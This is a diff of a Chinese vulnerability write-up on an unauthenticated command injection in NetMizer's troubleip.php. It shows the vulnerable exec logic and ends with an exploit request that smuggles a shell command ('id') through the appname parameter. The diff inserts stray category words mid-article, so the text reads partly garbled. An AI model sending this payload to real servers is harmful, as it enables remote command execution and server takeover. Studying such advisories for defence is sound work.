@@ -8,6 +8,8 @@ asset_dir: embedded-base64
 
 NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/troubleip.php` 文件存在[命令执行](https://mrxn.net/tag/rce "标签：命令执行")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。
 
+软件
+
 # 影响版本
 
 老旧版本
@@ -19,6 +21,14 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 # 漏洞分析
 
 看下 `troubleip.php` 业务实现关键逻辑部分
+
+深入探索
+
+防病毒程序与恶意软件
+
+编程
+
+网络安全
 
 ```
 else if($action == 'showtask'){
@@ -62,11 +72,21 @@ if($fp) {
 echo '{"success":true}';
 ```
 
+深入探索
+
+计算机安全
+
+网络
+
+计算机服务器
+
 `$appname` 也是直接拼接进[命令执行](https://mrxn.net/tag/rce "标签：命令执行")字符串中用 exec 来执行最终的命令，造成[命令注入](https://mrxn.net/tag/rce)漏洞。
 
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
+
+计算机安全
 
 ```
 GET /data/search/troubleip.php?action=showtask&appname=search;id+%23+&id=1 HTTP/1.1
